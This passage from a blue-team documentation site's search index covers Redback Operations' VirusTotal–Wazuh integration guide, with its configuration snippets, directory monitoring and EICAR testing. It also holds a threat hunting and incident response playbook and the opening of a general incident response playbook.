Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#1-introduction","content":" This document provides a brief overview of VirusTotal and the rationale behind integrating it with Wazuh on Redback Operations' VM. Additionally, this document will provide step-by-step instructions to show how future users can understand, maintain and improve the integration. It will also describe limitations and future work directions.  ","version":"Next","tagName":"h2"},{"title":"2. Background​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#2-background","content":" Redback Operations currently protects its company VM with a Wazuh SIEM and installed agent. The agent is installed directly on the VM and gathers information about the operating environment. The information is then forwarded to the Wazuh SIEM, which provides an overview of all events tracked by the agent. Currently, apart from the basic rootcheck module, the agent is not configured to check for malicious files, which poses a security risk.  To this end, it is proposed that VirusTotal be integrated within Wazuh's FIM (file integrity module). The module can track changes made to key directories in real time, such as written files. If configured, the FIM module can extract the hashes of these written files and forward them to the online VirusTotal service. VirusTotal can look up these hashes and note if they are malicious or benign. This look up information can also be forwarded to the Wazuh SIEM. Thus, this integration allows Wazuh to check if any malicious files were written to an agent's system in real time.  ","version":"Next","tagName":"h2"},{"title":"3. Configuration Steps​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#3-configuration-steps","content":" ","version":"Next","tagName":"h2"},{"title":"3.1. Obtain an API key from VirusTotal​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#31-obtain-an-api-key-from-virustotal","content":" First, visit https://www.virustotal.com/gui/join-us and create a Community account.  Press on your profile -&gt; API Key. Copy the key. This key will be used to interact with VirusTotal.  ","version":"Next","tagName":"h3"},{"title":"3.2. Modify the Wazuh manager's ossec.conf file​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#32-modify-the-wazuh-managers-ossecconf-file","content":" The Wazuh manager is a part of Wazuh and acts like the server. The manager reads from the ossec.conf file, which specifies configuration settings. You need to modify this file to add the API information for VirusTotal.  To find the file, run docker ps. You will see a running instance called single-node_wazuh.manager_1.  Inspect this instance using docker inspect single-node_wazuh.manager_1. Note the presence of ossec.conf. In fact, ossec.conf is a file stored inside the respective Docker instance. If you were to go into the Docker instance and modify the file directly, whenever the Docker instance restarts all progress would be lost. Instead, to achieve data persistence, these files are mapped to files outside of the containers. Modifying these mapped files ensures that no data is lost when the containers are restarted. In this case, the manager's ossec.conf file is mapped to wazuh_manager.conf. So, you need to modify this file instead.  Open the file using any editor (you will need higher privileges for this) and add the following code block:  &lt;integration&gt; &lt;name&gt;virustotal&lt;/name&gt; &lt;api_key&gt;&lt;VIRUSTOTAL_API_KEY&gt;&lt;/api_key&gt; &lt;!-- Replace with your VirusTotal API key --&gt; &lt;group&gt;syscheck&lt;/group&gt; &lt;alert_format&gt;json&lt;/alert_format&gt; &lt;/integration&gt;   See the example screenshot. Since this resource is publicly available, half of the API key has been blurred out.  Save your changes and restart the manager container.  On the Wazuh dashboard, an option for VirusTotal will show up now.  ","version":"Next","tagName":"h3"},{"title":"3.3. Change the agent's FIM settings​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#33-change-the-agents-fim-settings","content":" Now that the manager has been set up with VirusTotal, you need to modify the FIM settings to perform real-time scanning on a specified number of directories. By default, FIM performs a full system scan with several default system directories every 12 hours, but this is not ideal. To modify this, you need to access the ossec.conf file of the agent, NOT the manager. The agent file is by default stored under /var/ossec/etc in the agent's system. You need elevated privileges to access this file.  Once there, you can choose any directories to monitor. However, due to API limitations, these must be directories that are not very active. For example, since the Data Warehouse's file upload tool uses the dw-bucket-bronze directory, it is useful to monitor this directory in case a malicious file gets uploaded. While Deakin seems to have an IPS installed that detects malicious uploads on its network, it is valuable regardless to monitor this directory as an extra layer of security.  Finally, the /usr/bin and /usr/sbin directories store important system and user binaries. It would be valuable to monitor these.  Add the following code block to the syscheck section:  &lt;directories check_all=&quot;yes&quot; realtime=&quot;yes&quot;&gt;/usr/bin, /usr/sbin, /var/lib/docker/volumes/data-lakehouse_minio-data/_data/dw-bucket-bronze&lt;/directories&gt;   check_all ensures that all important information is extracted from any files written to these directories, including their hashes. realtime ensures that these directories are always monitored. Note that you can modify these directories as needed.  See the example screenshot.  Note in the previous screenshot the second line containing critical system files like /etc/passwd and /etc/shadow. While not entirely related to VirusTotal integration, these files and directories were added to the real-time checking module, away from the default 12-hour checks. The rationale behind this was that these files and directories contain critical information that, when modified, could be indicative of an attack.  Save your changes and restart the wazuh-agent process.  ","version":"Next","tagName":"h3"},{"title":"3.4. Test VirusTotal integration​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#34-test-virustotal-integration","content":" You can write files to monitored directories and see corresponding alerts appear in both the FIM and VirusTotal modules. As an example, assume that you have modified the previous sysconfig block to monitor the non-critical /tmp and /var/tmp directories. While VirusTotal integration would not work well on these directories on an ongoing basis, they are good starting points nonetheless to try out the FIM without damaging anything. The actual company implementation does NOT monitor these directories.  To demonstrate the monitoring, &quot;tst.txt&quot; files were written to the non-critical /tmp and /var/tmp directories. The hashes of the files were extracted by FIM and sent to VirusTotal, which had no results.   Moreover, you can also test the VirusTotal integration using malicious files such as EICAR. EICAR is a &quot;safe&quot; malicious file used to test basic anti-virus capabilities. First, download the file in any monitored directory.  Note the corresponding warning on the VirusTotal tab, with a label (&quot;1&quot;) noting that the file is malicious. There is also a corresponding link which describes the file in more detail.  ","version":"Next","tagName":"h3"},{"title":"3.5. Limitations​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#35-limitations","content":" The tool was implemented using the Public API, which is limited to 500 requests per day and 4 requests per minute. Thus, VirusTotal cannot be used for system-wide monitoring. Likewise, the Public API is severely limited to directories which do have a lot of recurring file modifications. While this is useful for, say, the internal file upload tool, it also means that popular malware directories like /tmp cannot be effectively monitored. Consequently, future work will need to focus on tools that do not rely on APIs, like YARA and ClamAV, to complement this hash-based approach.  In addition, the tool uses hashes to detect uploaded malware samples. Yet, these hashes are limited to known malware samples. If an attacker were to apply an obfuscation or modification technique to an existing sample, which they have not applied elsewhere, VirusTotal would likely not detect the sample. Thus, while this integration enhances a defence-in-depth strategy, it should not be relied upon as the sole security measure.  Finally, the Public API is forbidden to be used in a commercial setting. Hence, if Redback Operations were to move to a commercial setting in the future, they would need to investigate the Premium API or other options.  ","version":"Next","tagName":"h3"},{"title":"4. References​","type":1,"pageTitle":"Integrating VirusTotal into Wazuh","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh Integrations/VirusTotal-Integration#4-references","content":" VirusTotal Integration Wazuh GuideEICAR ","version":"Next","tagName":"h2"},{"title":"Threat Hunting and Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#1-introduction","content":" ","version":"Next","tagName":"h2"},{"title":"Overview​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#overview","content":" This playbook lays out the practical steps we will take to hunt for threats and respond to incidents within Redback Operations. The approach is built on real-world scenarios we have encountered and is designed to be used by all members of our cybersecurity teams.  ","version":"Next","tagName":"h3"},{"title":"Context​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#context","content":" Our operations are based in virtual environments, with VMs provided through Deakin University’s VPN. We have integrated tools like SIEM, Suricata, Wazuh, Nagios, and now VirusTotal within Wazuh, which gives us a strong base for both initiative-taking threat hunting and reactive incident response.  ","version":"Next","tagName":"h3"},{"title":"2. Purpose and Scope​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#2-purpose-and-scope","content":" ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#purpose","content":" This playbook is intended to guide us through identifying and mitigating threats as efficiently as possible. By following these steps, we aim to minimize the impact of security incidents and keep our systems—and by extension, our projects—secure.  ","version":"Next","tagName":"h3"},{"title":"Scope​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#scope","content":" Everyone in the cybersecurity teams at Redback Operations—SecDevOps, GRC, Blue Team, Red Team, Infrastructure Team—is expected to follow this playbook. It applies across all our digital workspaces, particularly the VMs we use daily.  ","version":"Next","tagName":"h3"},{"title":"3. Roles and Responsibilities​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#3-roles-and-responsibilities","content":" Threat Hunting Team  Lead Threat Hunter Responsibilities: Oversee threat hunting, decide which threats to prioritize, and ensure hunts are well-documented. Threat Hunters Responsibilities: Carry out the hunting process, using tools like Wazuh (with VirusTotal integration) to analyze data for signs of compromise. Tool Specialists Responsibilities: Keep tools like SIEM, Suricata, Wazuh, and Nagios running smoothly and optimally configured.  Incident Response Team  Incident Response Lead (IRL) Responsibilities: Lead the response to incidents, coordinating all actions to resolve the issue efficiently. Incident Responders Responsibilities: Handle the containment, eradication, and recovery phases of incidents. Forensics Analysts Responsibilities: Analyze compromised systems to understand the scope and impact of an incident. Communications Officer Responsibilities: Manage all communication during an incident, ensuring information is clear and accurate.  Support Teams  IT Support Responsibilities: Assist in system restoration and ensure infrastructure is secure post-incident. Legal and Compliance Responsibilities: Ensure our incident response is compliant with all legal and regulatory requirements. Management Responsibilities: Provide necessary oversight and resources to support effective threat hunting and incident response.  ","version":"Next","tagName":"h2"},{"title":"4. Incident Response Workflow​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#4-incident-response-workflow","content":" The incident response process at Redback Operations involves several key stages:  Detection of the issue, either by the system or reported by a user.Analysis and escalation by the Security Analyst.Confirmation of the incident and initiation of containment by the Incident Response Team.Containment and, if successful, moving onto recovery efforts.Post-incident review and documentation of lessons learned.      ","version":"Next","tagName":"h2"},{"title":"Explanation:​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#explanation","content":" Actors and Participants:  User (U): Represents the end-user who detects an issue.System (Sys): The system that detects and sends alerts.Security Analyst (SA): The security professional who escalates the incident.Incident Response Team (IRT): The team responsible for managing the incident.  Flow:  The user detects an issue, and the system sends an alert.The security analyst escalates the incident to the incident response team.The team confirms the incident, starts containment, and initiates recovery.Once recovery is successful, the incident is resolved, and the user is updated.  ","version":"Next","tagName":"h3"},{"title":"5. Threat Hunting Framework​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#5-threat-hunting-framework","content":" ","version":"Next","tagName":"h2"},{"title":"5.1. Preparation Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#51-preparation-phase","content":" Establish Baselines: We need to understand what normal operations look like across our VMs, including typical network traffic and system processes.Tool Configuration: Verify that all tools, especially Wazuh with VirusTotal integration and Nagios, are configured to provide actionable data with minimal false positives.Hypothesis Development: Based on recent threat intelligence and known vulnerabilities, create specific hypotheses to guide our threat hunting efforts.  ","version":"Next","tagName":"h3"},{"title":"5.2. Hunting Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#52-hunting-phase","content":" Data Collection: Gather data from our tools—SIEM for event correlation, Suricata for network traffic, Wazuh for endpoint monitoring, and Nagios for system performance.Hypothesis Testing: Analyze the collected data to validate or disprove the hypotheses, focusing on any anomalies identified by VirusTotal scans within Wazuh.  ","version":"Next","tagName":"h3"},{"title":"5.3. Analysis Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#53-analysis-phase","content":" Pattern Recognition: Look for patterns in the data that suggest malicious activity, such as unusual traffic or system performance issues flagged by Nagios.Behavioral Analysis: Dive deeper into any suspicious activity, correlating it across multiple data sources to see if it fits the profile of a known threat.Threat Attribution: If a threat is detected, use available threat intelligence to determine its origin and actors.  ","version":"Next","tagName":"h3"},{"title":"5.4. Discovery Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#54-discovery-phase","content":" IOC Identification: Document any Indicators of Compromise (IOCs) discovered during analysis, such as malicious IPs or file hashes flagged by VirusTotal.Threat Validation: Confirm that the threat is real and not a false positive by performing further checks, involving sandboxing or deeper forensics.Threat Reporting: Compile a report detailing the findings and share it with the Incident Response Team for further action.  ","version":"Next","tagName":"h3"},{"title":"5.5. Reporting Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#55-reporting-phase","content":" Threat Report Compilation: Summarize the key findings in a clear and actionable report that includes technical analysis and recommended next steps.Dissemination: Distribute the report to all relevant stakeholders, ensuring that everyone is aware of the findings and the required response actions.  ","version":"Next","tagName":"h3"},{"title":"6. Incident Response Framework​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#6-incident-response-framework","content":" ","version":"Next","tagName":"h2"},{"title":"6.1. Identification Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#61-identification-phase","content":" Alert Triage: Monitor alerts from SIEM, Suricata, Wazuh (with VirusTotal), and Nagios. Prioritize based on severity and potential impact on our systems.Incident Classification: Classify the incident to determine the appropriate response strategy, considering the specific tools and systems affected.  ","version":"Next","tagName":"h3"},{"title":"6.2. Containment Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#62-containment-phase","content":" Immediate Containment: Isolate affected VMs or systems from the network to prevent further spread of the threat.Short-Term Containment: Apply temporary fixes, like blocking IPs or disabling compromised accounts, to keep the threat under control.Long-Term Containment: Implement more permanent solutions, such as patching vulnerabilities or improving access controls.  ","version":"Next","tagName":"h3"},{"title":"6.3. Eradication Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#63-eradication-phase","content":" Root Cause Analysis: Investigate the root cause of the incident, identifying how the threat entered the environment.Threat Removal: Remove the threat entirely, whether it involves deleting malware, reconfiguring systems, or resetting compromised accounts.Validation of Eradication: Ensure that the threat has been fully eradicated by performing follow-up scans and monitoring.  ","version":"Next","tagName":"h3"},{"title":"6.4. Recovery Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#64-recovery-phase","content":" System Restoration: Restore systems to normal operation, ensuring they are secure before reconnecting to the network.Verification of Integrity: Verify that all systems are functioning properly and that no residual issues remain from the incident.Post-Recovery Monitoring: Keep a close watch on recovered systems to detect any signs of residual threats or reinfection.  ","version":"Next","tagName":"h3"},{"title":"6.5. Lessons Learned Phase​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#65-lessons-learned-phase","content":" Post-Incident Review (PIR): After resolving the incident, review the response process to identify strengths and areas for improvement.Root Cause Documentation: Document the root cause and response actions taken, using this information to update our procedures and tools.Process Improvement: Update the playbook based on lessons learned, ensuring that we continually improve our threat hunting and incident response capabilities.  ","version":"Next","tagName":"h3"},{"title":"7. Communication and Escalation Procedures​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#7-communication-and-escalation-procedures","content":" Internal Communication  Incident Notification: Notify key stakeholders as soon as an incident is detected.Status Updates: Provide regular updates throughout the incident response process to keep everyone informed.Escalation Protocols: Know when to escalate incidents to higher management or involve external partners.  External Communication  Customer and Partner Notification: If necessary, inform external parties of the incident, following legal and compliance guidelines.Media Relations: Handle media inquiries carefully, ensuring that all information shared is accurate and controlled.Regulatory Notification: Notify regulatory bodies if required, adhering to legal requirements for incident reporting.  ","version":"Next","tagName":"h2"},{"title":"8. Tools, Technologies, and Techniques​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#8-tools-technologies-and-techniques","content":" ","version":"Next","tagName":"h2"},{"title":"SIEM (Security Information and Event Management)​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#siem-security-information-and-event-management","content":" Role: Centralizes and correlates security data from various sources, providing real-time alerts and insights.Key Functions: Monitoring, event correlation, alerting.  ","version":"Next","tagName":"h3"},{"title":"Suricata​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#suricata","content":" Role: Monitors network traffic for suspicious activity, acting as an IDS/IPS.Key Functions: Network traffic analysis, anomaly detection.  ","version":"Next","tagName":"h3"},{"title":"Wazuh (with VirusTotal Integration)​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#wazuh-with-virustotal-integration","content":" Role: Monitors endpoints for security issues and integrates with VirusTotal to provide additional malware detection capabilities.Key Functions: Log analysis, file integrity monitoring, real-time malware scanning via VirusTotal.  ","version":"Next","tagName":"h3"},{"title":"Nagios​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#nagios","content":" Role: Monitors the performance and availability of systems, alerting us to any issues that might indicate a security problem.Key Functions: System performance monitoring, alerting on failures or anomalies.  ","version":"Next","tagName":"h3"},{"title":"OpenCTI (if implemented)​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#opencti-if-implemented","content":" Role: Provides a centralized platform for managing threat intelligence, helping us stay informed about emerging threats.Key Functions: Threat intelligence aggregation, analysis, and integration with other tools.  ","version":"Next","tagName":"h3"},{"title":"MQTT​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#mqtt","content":" Role: Used for secure messaging in IoT projects, requiring careful monitoring for anomalies.Key Functions: Secure messaging, real-time monitoring of IoT communications.  ","version":"Next","tagName":"h3"},{"title":"9. Post-Incident Activities and Continuous Improvement​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#9-post-incident-activities-and-continuous-improvement","content":" ","version":"Next","tagName":"h2"},{"title":"1. Documentation​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#1-documentation","content":" Incident Documentation: Keep detailed records of every incident, including timelines, actions taken, and outcomes. This helps us learn and improve.Lessons Learned Reports: After each incident, write up what we learned and how we can do better next time.  ","version":"Next","tagName":"h3"},{"title":"2. Process Improvement​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#2-process-improvement","content":" Process Audits: Regularly audit our threat hunting and incident response processes to make sure they are still effective and up to date.Policy Updates: Based on lessons learned, update our policies and procedures to prevent future incidents.Technology Evaluation: Periodically evaluate our tools to ensure they are still meeting our needs and keeping pace with new threats.  ","version":"Next","tagName":"h3"},{"title":"3. Training and Drills​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#3-training-and-drills","content":" Refresher Training: Regularly train our team on the playbook, focusing on any areas where we identified gaps during incidents.Scenario-Based Drills: Conduct drills to practice our response to different types of incidents. Use these exercises to refine our processes.  ","version":"Next","tagName":"h3"},{"title":"10. Playbook Maintenance and Review Cycle​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#10-playbook-maintenance-and-review-cycle","content":" ","version":"Next","tagName":"h2"},{"title":"Review Frequency​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#review-frequency","content":" Quarterly Review: Every three months, review the playbook to ensure it reflects the current threat landscape and our operational environment.Post-Incident Review: After every significant incident, review the playbook to see if any changes are needed based on what we learned.Annual Audit: Once a year, conduct a thorough audit of the playbook to ensure it aligns with industry best practices and any regulatory requirements.  ","version":"Next","tagName":"h3"},{"title":"Version Control​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#version-control","content":" Document Versions: Each time the playbook is updated, assign a new version number (e.g., v1.1, v2.0) and keep a detailed change log.Change Log: Maintain a record of all changes, including what was updated, why, and who approved the changes.Approval Process: All updates to the playbook must be approved by the Incident Response Lead and other relevant stakeholders.  ","version":"Next","tagName":"h3"},{"title":"Feedback Mechanisms​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#feedback-mechanisms","content":" Internal Feedback Loop: Regularly gather feedback from team members to identify areas where the playbook can be improved.External Feedback and Peer Review: Engage with external experts to get an outside perspective on our playbook and processes.Continuous Improvement: Use the feedback to continuously refine and improve the playbook, keeping it relevant and effective.  ","version":"Next","tagName":"h3"},{"title":"11. Appendices​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#11-appendices","content":" ","version":"Next","tagName":"h2"},{"title":"Appendix A: Threat Intelligence Sources​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#appendix-a-threat-intelligence-sources","content":" External Sources: Include details on threat intelligence feeds we use, such as STIX/TAXII feeds, government advisories, and industry-specific intel.Internal Sources: Outline our internal sources, like SIEM logs and incident reports, which help inform our threat hunting.  ","version":"Next","tagName":"h3"},{"title":"Appendix B: Incident Response Contact List​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#appendix-b-incident-response-contact-list","content":" Incident Response Team: List contact information for key personnel, including the Incident Response Lead, Threat Hunters, Forensics Analysts, and Communications Officer.Support Teams: Include contact details for IT Support, Legal, and Management.Escalation Contacts: Provide escalation contacts, including university security team and external partners.  ","version":"Next","tagName":"h3"},{"title":"Appendix C: Threat Hunting Checklist​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#appendix-c-threat-hunting-checklist","content":" Preparation: Confirm that baselines are up-to-date, and tools are correctly configured.Hunting: Collect and analyze data, testing hypotheses as you go.Reporting: Document findings and share them with the necessary teams.  ","version":"Next","tagName":"h3"},{"title":"Appendix D: Incident Response Checklist​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#appendix-d-incident-response-checklist","content":" Identification: Triage alerts and classify the incident.Containment: Quickly isolate and contain the threat.Eradication and Recovery: Remove the threat and restore systems, verifying integrity before reconnecting to the network.Lessons Learned: Conduct a review and document what was learned.  ","version":"Next","tagName":"h3"},{"title":"Appendix E: Legal and Compliance Considerations​","type":1,"pageTitle":"Threat Hunting and Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Threat hunting and incidnet response playbook#appendix-e-legal-and-compliance-considerations","content":" Data Breach Notification: Summarize the legal requirements for notifying affected parties and authorities in the event of a data breach.Internal Policies: List internal policies related to data handling and incident response.International Considerations: If applicable, include guidelines for complying with international data protection laws. ","version":"Next","tagName":"h3"},{"title":"Redback Operations General Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#introduction","content":" ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#11-overview","content":" In today's interconnected digital landscape, cybersecurity breaches pose significant risks to organizations of all sizes and industries. Redback Operations faces potential security breaches and disruptions that can lead to severe consequences, such as financial loss and reputational damage. Whether dealing with sophisticated cyber-attacks or unintentional data leaks by insiders, Redback Operations must navigate these challenges effectively. The Redback Operations Incident Response Playbook is a comprehensive guide designed to equip Redback Operations with the tools, strategies, and best practices needed to effectively restore systems, data, and operations after a security breach. This manual aims to mitigate the impact of incidents, minimize downtime, and protect against future threats.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#12-purpose","content":" The primary purpose of the Redback Operations Incident Response Playbook is to create a unified and coordinated approach to recovery operations. It provides clear instructions and actionable steps to navigate disruptions, ensuring Redback Operations are well-prepared to handle security breaches and emerge stronger and more resilient.  ","version":"Next","tagName":"h3"},{"title":"1.3 Definition of Attack​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#13-definition-of-attack","content":" The term &quot;attack&quot; encompasses a broad spectrum of malicious actions threatening the security, integrity, or availability of Redback Operations' systems, networks, or data. This includes intentional actions by external threat actors and inadvertent errors by internal users.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#14-scope","content":" The playbook covers all types of security incidents and disruptions, including malicious activities (cyber-attacks, data breaches, phishing attempts) and non-malicious events (system failures, natural disasters, human errors). This comprehensive approach ensures a flexible and adaptive response to various threats.  ","version":"Next","tagName":"h3"},{"title":"2 Attack Types​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#2-attack-types","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Insider Threat​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#21-insider-threat","content":" Insider threats are of particular concern to Redback because people within an organization can misuse their access rights to compromise security, integrity, or availability of Redback's systems, networks, or data. These individuals may include employees, contractors, or other trusted entities that pose a serious threat to the organization's cybersecurity posture. Insider threats come in many forms, including unauthorized access to confidential information, data breaches, obstruction, and negligence. For example, employees can directly access Redback systems and abuse their rights to steal confidential data for personal gain or inadvertently reveal confidential information by tampering with company assets. Detecting and mitigating insider threats requires a multi-layered approach that includes implementing strong access controls, monitoring user activity, and conducting regular security briefings, and creating a culture of accountability and trust within the organization.  Case Study: Edward Snowden (2013)  Overview: Snowden, a former NSA contractor, leaked classified information to the public.Impact: The leaks exposed global surveillance programs and caused diplomatic tensions.Response: The NSA reviewed and enhanced its access controls and insider threat programs.  ","version":"Next","tagName":"h3"},{"title":"2.2 External Attacks​","type":1,"pageTitle":"Redback Operations General Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Redback Incident Response Playbook#22-external-attacks","content":" External attacks against Redback originate from threat actors outside the organization's domain, 